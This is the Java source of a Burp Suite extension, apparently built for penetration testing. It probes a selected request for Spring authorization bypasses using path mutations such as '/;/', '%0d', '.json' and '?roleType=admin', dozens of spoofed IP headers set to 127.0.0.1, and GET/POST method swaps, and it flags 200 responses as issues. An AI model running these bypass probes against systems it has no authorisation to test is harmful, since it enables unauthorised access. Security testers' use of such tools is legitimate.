package extension;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutionException;
import javax.swing.*;

public class MyContextMenus implements ContextMenuItemsProvider {
    List<AuditIssue> activeAuditIssues = new ArrayList<AuditIssue>();

    public List<AuditIssue> getActiveAuditIssues() {
        return new ArrayList<>(this.activeAuditIssues); // 返回一个新的列表以避免外部修改原列表
    }


    private final MontoyaApi api;

    public MyContextMenus(MontoyaApi api) {
        this.api = api;
    }
    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menus = new ArrayList<>();
        JMenuItem TestJMenuItem = new JMenuItem("springauthbypass");
        TestJMenuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                api.logging().logToOutput("staringworking");
                HttpRequestResponse requestResponse = getSelectedHttpRequestResponse(event);
                if(requestResponse != null) {
                    String nowurlpath = requestResponse.request().path();
                    List<String> allurlpaths = varyurls(nowurlpath);
                    sendlist(allurlpaths, requestResponse);
//                    api.logging().logToOutput("now is"+activeAuditIssues.toString());

                } else{
                    api.logging().logToError("The request is not selected correctly");
                }
            }
        });
        menus.add(TestJMenuItem);
        return menus;
    }
    public  AuditResult activeAudit() {
        api.logging().logToOutput("bypass success");
        return AuditResult.auditResult(activeAuditIssues);

    }
    public class springbypass {


        public static String springauthbypassIssueName = "Spring bypass";
        public static String springauthbypassIssueDetail = "";
        public static AuditIssueSeverity springauthbypassIssueSeverity = AuditIssueSeverity.HIGH;
        public static AuditIssueConfidence springauthbypassIssueConfidence = AuditIssueConfidence.FIRM;
        public static AuditIssueSeverity springauthbypassIssueTypicalSeverity = AuditIssueSeverity.HIGH;

        public static String passiveSerializationIssueName = "Spring bypass";
        public static String passiveSerializationIssueDetail = "";
        public static AuditIssueSeverity passiveSerializationIssueSeverity = AuditIssueSeverity.INFORMATION;
        public static AuditIssueConfidence passiveSerializationIssueConfidence = AuditIssueConfidence.FIRM;
        public static AuditIssueSeverity passiveSerializationIssueTypicalSeverity = AuditIssueSeverity.INFORMATION;

    }
    public void sendlist(List<String> allurlpaths, HttpRequestResponse requestResponse) {
        SwingWorker<Void, Object[]> worker = new SwingWorker<Void, Object[]>() {
            @Override
            protected Void doInBackground() throws ExecutionException, InterruptedException {
//                for (String path : allurlpaths) {
//                    api.http().sendRequest(requestResponse.request().withPath(path));
//                    publish(path);  // 如果需要更新 UI，可以使用 publish
//                }
                for (int i = 0; i<allurlpaths.size(); i++){
                    String path = allurlpaths.get(i);
                    HttpResponse response = api.http().sendRequest(requestResponse.request().withPath(path)).response();  //多请求必须要加上线程，不然会崩溃，造成线程阻塞，可以使用swingworker来解决线程堵塞的问题
                    HttpRequest request = requestResponse.request().withPath(path);
                    publish(new Object[]{response,request,requestResponse});
                }
                api.http().sendRequest(requestResponse.request().withHeader(HttpHeader.httpHeader("Base-Url","127.0.0.1")).withHeader(HttpHeader.httpHeader("Base-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Client-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Http-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Proxy-Host","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Proxy-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Real-Ip","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Redirect","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Referer","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Referrer","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Refferer","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Request-Uri","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Uri","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Client-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Custom-IP-Authorization","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forward-For","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-By","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-For-Original","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-For","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Host","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","443"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","4443"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","80"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","8080"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","8443"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Scheme","http"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Scheme","https"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Server","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarder-For","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Host","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Http-Destinationurl","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Http-Host-Override","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Original-Remote-Addr","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Original-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Originating-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Proxy-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Real-Ip","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Remote-Addr","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Remote-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Rewrite-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-True-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Cdn-Real-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Cluster-Client-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("WL-Proxy-Client-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Proxy-Client-IP","127.0.0.1")));


                if(!requestResponse.request().method().toString().equals("GET")){
                    HttpResponse response = api.http().sendRequest(requestResponse.request().withMethod("POST")).response();
                    HttpRequest request = requestResponse.request().withMethod("POST");
                    publish(new Object[]{response,request,requestResponse});
                }
                if(!requestResponse.request().method().toString().equals("POST")){
                    HttpResponse response = api.http().sendRequest(requestResponse.request().withMethod("GET")).response();
                    HttpRequest request = requestResponse.request().withMethod("GET");
                    publish(new Object[]{response,request,requestResponse});
                }

                return null;
        }
            @Override
            protected void process(List<Object[]> chunks) {
                // 这里可以更新 UI，比如显示已处理的路径
                for (Object[] chunk : chunks) {
//                    String path = (String) chunk[0];
                    HttpResponse response = (HttpResponse) chunk[0];
                    HttpRequest request = (HttpRequest) chunk[1];
                    HttpRequestResponse RequestResponse = (HttpRequestResponse) chunk[2];
                    int statusCode = response.statusCode();
                    api.logging().logToOutput("Response code is " + statusCode);
                    if (statusCode == 200) {
                        api.logging().logToOutput("Response for " + request.url() + " is 200");
                        AuditIssue auditIssue = AuditIssue.auditIssue(springbypass.springauthbypassIssueName,
                                springbypass.springauthbypassIssueDetail,
                                null, // remediation
                                request.url(),
                                springbypass.springauthbypassIssueSeverity,
                                springbypass.springauthbypassIssueConfidence,
                                null,
                                null,
                                springbypass.springauthbypassIssueTypicalSeverity,
                                RequestResponse);
                        activeAuditIssues.add(auditIssue);
                        api.logging().logToOutput(auditIssue.toString());
                        api.logging().logToOutput("Added issue for " + request.url());
                        api.siteMap().add(RequestResponse);
                    }
                    // 更新UI等操作
                }
            }
            @Override
            protected void done() {
                try {
                    api.logging().logToOutput("right now is"+activeAuditIssues.toString());
                    get(); // 检查是否有异常
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        worker.execute();
//        api.logging().logToOutput(String.valueOf(requestResponse.response().statusCode()));

    }
    private HttpRequestResponse getSelectedHttpRequestResponse(ContextMenuEvent event) {
        // 获取当前选中的 HttpRequestResponse 对象
        return event.messageEditorRequestResponse().isPresent()
                ? event.messageEditorRequestResponse().get().requestResponse()
                : event.selectedRequestResponses().isEmpty() ? null : event.selectedRequestResponses().get(0);
    }
    private  List<String> varyurls(String urlpath) { //采用static,可以直接调用类里面的方法，不用声明实例。
        List<String> allurlpaths = new ArrayList<>();
        if(!urlpath.isEmpty()){
            api.logging().logToOutput(urlpath);

            // 1. 最后一个目录加上 /
            String withTrailingSlash = urlpath.replaceAll("([^/?]+)(\\?.*)?$", "$1/$2");
            allurlpaths.add(withTrailingSlash);

            // 2. 最后一个目录加上 .json
            String withJson = urlpath.replaceAll("([^/?]+)(\\?.*)?$", "$1.json$2");
            allurlpaths.add(withJson);

            // 3. 最后一个目录加上 .111
            String with111 = urlpath.replaceAll("([^/?]+)(\\?.*)?$", "$1.111$2");
            allurlpaths.add(with111);

            if (!urlpath.contains("?")) {
                String withId = urlpath + "?id=1";
                allurlpaths.add(withId);
            }
            if (!urlpath.contains("?")) {
                String roleid = urlpath + "?role=1";
                allurlpaths.add(roleid);
            }
            if (!urlpath.contains("?")) {
                String roletype = urlpath + "?roleType=admin";
                allurlpaths.add(roletype);
            }

            // 5. 最后一个目录加上 /%0d
            String withCR = urlpath.replaceAll("([^/?]+)(\\?.*)?$", "$1%0d$2");
            allurlpaths.add(withCR);

            // 7. 一个一个 / 变为 /;/
            for (int i = 0; i < urlpath.length(); i++) {
                if (urlpath.charAt(i) == '/') {
                    String modifiedPath = urlpath.substring(0, i) + "/;" + urlpath.substring(i);
                    allurlpaths.add(modifiedPath);
                }
            }
            // 8. 一个一个 / 变成 //;//
            for (int i = 0; i < urlpath.length(); i++) {
                if (urlpath.charAt(i) == '/') {
                    String modifiedPath = urlpath.substring(0, i) + "//;/" + urlpath.substring(i);
                    allurlpaths.add(modifiedPath);
                }
            }
            api.logging().logToOutput(allurlpaths.toString());
        }else {
            api.logging().logToError("The url is empty");
        }
        return  allurlpaths;
    }
}